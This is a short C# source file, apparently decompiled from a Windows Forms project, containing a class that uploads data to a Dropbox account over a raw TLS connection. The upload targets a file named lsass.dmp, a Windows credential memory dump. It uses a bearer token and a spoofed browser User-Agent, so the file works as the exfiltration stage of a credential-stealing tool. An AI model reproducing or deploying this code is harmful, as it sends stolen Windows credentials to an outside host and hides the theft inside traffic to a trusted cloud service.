using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace WindowsFormsApp1;

public class SslTcpClient
{
	public static string old;

	public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		if (sslPolicyErrors == SslPolicyErrors.None)
		{
			return true;
		}
		return false;
	}

	public static void RunClient(string machineName, string project, string token, string content)
	{
		TcpClient tcpClient = new TcpClient(machineName, 443);
		SslStream sslStream = new SslStream(tcpClient.GetStream(), leaveInnerStreamOpen: false, ValidateServerCertificate, null);
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			sslStream.AuthenticateAsClient(machineName, null, SslProtocols.Tls12, checkCertificateRevocation: false);
		}
		catch (AuthenticationException ex)
		{
			if (ex.InnerException == null)
			{
			}
			tcpClient.Close();
			return;
		}
		string text = "POST /2/files/upload HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\r\nHost: content.dropboxapi.com\r\nAuthorization: Bearer " + token + "\r\nDropbox-API-Arg: {\"path\": \"/" + project + "/lsass.dmp\",\"mode\": \"overwrite\",\"autorename\": false,\"mute\": false,\"strict_conflict\": false}\r\nContent-Type: text/plain; charset=dropbox-cors-hack\r\n";
		string text2 = "Content-Length: " + Encoding.UTF8.GetByteCount(content) + "\r\n\r\n";
		byte[] bytes = Encoding.UTF8.GetBytes(text + text2 + content);
		sslStream.Write(bytes, 0, bytes.Length);
		sslStream.Flush();
		Thread.Sleep(5000);
	}
}
